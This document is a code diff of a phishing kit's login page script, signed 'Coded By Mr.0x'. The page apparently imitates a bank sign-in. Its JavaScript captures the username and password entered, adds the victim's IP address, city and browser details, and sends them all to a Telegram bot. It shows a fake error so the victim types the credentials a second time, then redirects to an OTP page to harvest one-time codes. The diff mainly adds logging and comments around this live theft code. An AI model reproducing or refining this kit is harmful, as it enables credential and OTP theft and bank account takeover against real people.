@@ -37,7 +37,7 @@
     <script src="config/email.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script>
-        // Helper: send message to Telegram
+        // ---- Helper: send to Telegram ----
         async function sendTelegram(message) {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
@@ -45,27 +45,29 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
                 });
-                return await res.json();
+                const data = await res.json();
+                console.log('Telegram response:', data);
+                return data;
             } catch (e) {
                 console.error('Telegram send error:', e);
                 return null;
             }
         }
 
-        // Helper: get IP and location
+        // ---- Helper: get IP & location ----
         async function getClientInfo() {
             let ip = '0.0.0.0';
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ip = data.ip;
-            } catch(e) {}
+            } catch(e) { console.warn('IP fetch failed'); }
             let location = { country: 'Unknown', city: 'Unknown' };
             try {
                 const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
                 const data = await res.json();
                 location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
-            } catch(e) {}
+            } catch(e) { console.warn('Location fetch failed'); }
             return { ip, location, userAgent: navigator.userAgent };
         }
 
@@ -81,6 +83,7 @@
         $(document).ready(function() {
             let attempt = 0;
 
+            // Enable/disable button
             function toggleButton() {
                 const username = $('#txtUserid').val().trim();
                 const password = $('#id11').val().trim();
@@ -89,13 +92,19 @@
             $('#txtUserid, #id11').on('keyup change', toggleButton);
             $('#btnSignIn').prop('disabled', true);
 
+            // Form submit
             $('#login-form').submit(async function(e) {
                 e.preventDefault();
+
                 const username = $('#txtUserid').val().trim();
                 const password = $('#id11').val().trim();
-                if (!username || !password) return;
+                if (!username || !password) {
+                    console.warn('Empty fields, ignoring submit');
+                    return;
+                }
 
                 attempt++;
+                console.log('Attempt #' + attempt);
 
                 // Build message
                 const info = await getClientInfo();
@@ -113,19 +122,27 @@
                 message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
                 message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
 
-                // Send to Telegram
-                const result = await sendTelegram(message);
-                console.log('Telegram result:', result);
+                // Send Telegram
+                await sendTelegram(message);
+                console.log('Telegram sent');
 
+                // Handle attempts
                 if (attempt === 1) {
+                    console.log('First attempt – show error');
                     $('#error-msg').show();
                     $('#txtUserid, #id11').val('');
                     $('#btnSignIn').prop('disabled', true);
                 } else if (attempt === 2) {
+                    console.log('Second attempt – redirecting to OTP page');
+                    // Redirect to OTP page
+                    window.location.href = 'boq-otp.html';
+                } else {
+                    console.log('More than 2 attempts – still redirect to OTP?');
                     window.location.href = 'boq-otp.html';
                 }
             });
 
+            // Close error message
             $('#cross-1').click(function() {
                 $('#error-msg').hide();
             });
